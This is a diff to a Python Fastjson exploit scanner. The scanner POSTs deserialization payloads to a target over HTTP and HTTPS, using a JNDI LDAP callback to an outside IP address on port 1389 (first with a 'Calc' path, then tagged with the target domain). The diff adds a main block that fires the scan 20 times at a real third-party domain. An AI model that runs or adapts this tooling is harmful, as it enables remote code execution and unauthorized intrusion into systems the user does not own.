@@ -11,7 +11,8 @@ class FastjsonScanner:
     def scanner_domain(self,domain):
         print("fasltjson扫描: "+domain)
         
-        ldapurl="ldap://47.104.218.243:1389/Calc"
+        
+        ldapurl="ldap://47.104.218.243:1389/" + domain
         
         CONFIG = {
             'url': domain,
@@ -24,26 +25,32 @@ class FastjsonScanner:
         headers = CONFIG['headers']
         
         try:
-            requests.post(url="http://" + url, data=data1, headers=headers, timeout=1)
+            requests.post(url="http://" + url, data=data1, headers=headers, timeout=2)
         except:
-            print("[exception]http request exception " + url)
+            print("[exception-1] http request exception " + url)
 
         try:
-            requests.post(url="https://" + url, data=data1, headers=headers, timeout=1)
+            requests.post(url="https://" + url, data=data1, headers=headers, timeout=2)
         except:
-            print("[exception]https request exception " + url )
+            print("[exception-2] https request exception " + url )
         
         try:
-            requests.post(url="http://" + url, data=data2, headers=headers, timeout=1)
+            requests.post(url="http://" + url, data=data2, headers=headers, timeout=2)
         except:
-            print("[exception]http request exception " + url)
+            print("[exception-3] http request exception " + url)
 
         try:
-            requests.post(url="https://" + url, data=data2, headers=headers, timeout=1)
+            requests.post(url="https://" + url, data=data2, headers=headers, timeout=2)
         except:
-            print("[exception]http request exception " + url)
+            print("[exception-4] https request exception " + url)
         
-        print("fastjson scan end.")
+        print(domain +" "+ "fastjson scan end.")
 
 
+if __name__ == '__main__': 
+    domain = "mms.vivo.com.cn" 
+    for i in range(20):
+        fs = FastjsonScanner()
+        fs.scanner_domain(domain)
+    
         
